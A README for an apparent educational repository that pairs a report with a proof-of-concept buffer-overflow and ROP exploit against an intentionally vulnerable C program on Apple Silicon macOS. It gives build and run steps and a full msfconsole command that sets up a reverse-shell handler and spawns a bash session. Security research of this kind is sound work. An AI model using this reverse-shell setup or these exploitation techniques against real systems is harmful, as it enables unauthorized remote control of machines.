## 📄 Project Overview

This repository contains the code and materials for the report titled “Exploiting Buffer Overflows on Apple M-Series Macs,” which demonstrates a proof-of-concept exploit on a vulnerable C program running on macOS (AArch64, Apple Silicon).

The exploit showcases:

- Stack-based buffer overflow
- Format string vulnerability
- ROP-based bypass of NX and ASLR
- Execution of payloads (Calculator, reverse shell)

> **Tested on:**
>
> - macOS Sequoia 15.5
> - Apple M3 MacBook Pro / M4 Mac mini
> - AArch64 (ARM64) architecture
> - ASLR / NX enabled (default security settings)

The report is included below for reference.

[📄 Download Report (PDF)](./report.pdf)

## ⚠ Disclaimer

This repository is intended for educational and research purposes only.  
The code demonstrates exploitation techniques in a controlled environment using an intentionally vulnerable binary.

**Use at your own risk.**  
The author is not responsible for any damage, misuse, or unintended consequences resulting from the use of this code.

Always review and understand the payloads and their effects before running them on any system.

## 🔧 Build Instructions

To compile the vulnerable binary (tested with Clang 17.0.0):

```
clang -o vulnerable main.c
```

## 🚀 Exploit Execution

To run the exploit (ensure Python 3 and pwntools are installed):

Install pwntools: `pip install pwntools`

```
python exploit.py
```

## 🛠 Reverse Shell Setup (optional)

To prepare a listener for the reverse shell payload, start msfconsole with the following command:

```
msfconsole -q -x "use exploit/multi/handler; \
  set payload osx/aarch64/shell_reverse_tcp; \
  set LHOST 127.0.0.1; \
  set LPORT 4444; \
  exploit -z; \
  sessions -1 -c \"python3 -c 'exec(\\\"\\\"\\\"import pty\npty.spawn(\\\"/bin/bash\\\")\\\"\\\"\\\")'\"; \
  sessions -1"
```

## 📝 License

This project is licensed under the [MIT License](./LICENSE).
